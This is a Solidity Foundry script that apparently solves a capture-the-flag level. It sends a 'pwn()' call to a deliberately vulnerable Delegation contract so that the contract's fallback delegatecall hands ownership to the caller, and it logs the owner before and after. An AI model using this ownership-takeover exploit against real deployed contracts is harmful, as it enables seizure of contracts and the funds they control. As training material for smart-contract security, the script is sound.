// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Delegation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract DelegationSolution is Script {
    Delegation public delegation = Delegation(0x94ba536AA38C1d57A38C4E46eD67058454651395);
    
    function run() external {
        console.log("Owner before: ", delegation.owner());
        console.log("Player", vm.envAddress("MY_ADDRESS"));

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address(delegation).call(abi.encodeWithSignature("pwn()"));

        console.log("Owner after: ", delegation.owner());

        vm.stopBroadcast();
    }
}